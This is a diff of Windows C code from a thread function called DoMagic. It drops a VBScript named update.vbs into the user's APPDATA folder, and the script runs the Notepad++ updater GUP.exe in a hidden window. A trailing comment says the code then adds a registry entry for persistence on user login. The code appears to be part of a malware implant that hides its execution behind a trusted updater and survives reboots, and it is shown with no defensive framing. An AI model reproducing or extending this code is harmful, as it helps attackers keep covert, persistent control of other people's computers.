@@ -61,14 +61,22 @@ DWORD WINAPI DoMagic(LPVOID lpParameter)
     GetEnvironmentVariableA("APPDATA", vbsPath, MAX_PATH);  
     strcat(vbsPath, "\\update.vbs"); 
 
-    // Create the VBS script to silently run GUP.exe
-    FILE* vbsFile = fopen(vbsPath, "w");
-    if (vbsFile) {
-        fprintf(vbsFile,
-            "Set WshShell = CreateObject(\"WScript.Shell\")\n"
-            "WshShell.Run \"\"\"C:\\Program Files\\Notepad++\\updater\\GUP.exe\"\"\", 0, False\n"
-        );
-        fclose(vbsFile);
+
+    // Check if VBS file already exists
+    FILE* checkFile = fopen(vbsPath, "r");
+    if (!checkFile) {
+        FILE* vbsFile = fopen(vbsPath, "w");
+        if (vbsFile) {
+            fprintf(vbsFile,
+                "Set WshShell = CreateObject(\"WScript.Shell\")\n"
+                "WshShell.CurrentDirectory = \"C:\\Program Files\\Notepad++\\updater\"\n"
+                "WshShell.Run \"\"\"GUP.exe\"\"\", 0, False\n"
+            );
+            fclose(vbsFile);
+        }
+    }
+    else {
+        fclose(checkFile);
     }
 
     // Add registry entry for persistence on user login
